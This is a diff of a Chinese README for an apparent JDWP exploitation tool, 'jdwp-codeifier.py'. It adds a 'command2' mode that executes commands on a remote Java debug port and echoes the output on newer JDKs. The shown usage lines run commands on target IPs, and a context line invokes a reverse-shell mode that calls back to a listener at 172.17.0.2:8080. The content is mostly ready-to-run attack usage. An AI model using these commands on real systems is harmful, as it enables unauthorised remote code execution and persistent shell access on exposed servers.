@@ -33,6 +33,9 @@ optional arguments:
 
 ### 命令执行
 项目也保留了原本的命令执行功能，但命令行参数略有不同，执行 touch /tmp/success：
+
+(需要回显使用-m command2)
+
 ```
 python jdwp-codeifier.py -t 172.17.0.3 -p 8000 -m command -c 'touch /tmp/success'
 ```
@@ -60,6 +63,14 @@ python jdwp-codeifier.py -t 172.17.0.3 -p 8000 -m rshell -a 172.17.0.2:8080 -l 0
 # -l 指定shell与服务器连接不上时的最大存活时间（分钟）（每隔5秒自动重连）
 ```
 ![Alt text](README/img2.png)
+
+## 命令执行回显
+由于高版本JDK不支持以上JS代码执行及回显，我又优化了下命令执行的逻辑，添加了命令执行回显，支持高版本JDK
+```
+python2 jdwp-codeifier.py -t 172.17.0.3 -p 5005 -m command2 -c 'ls'
+```
+
+![image-20241113222527330](./README/image-20241113222527330.png)
 
 
 
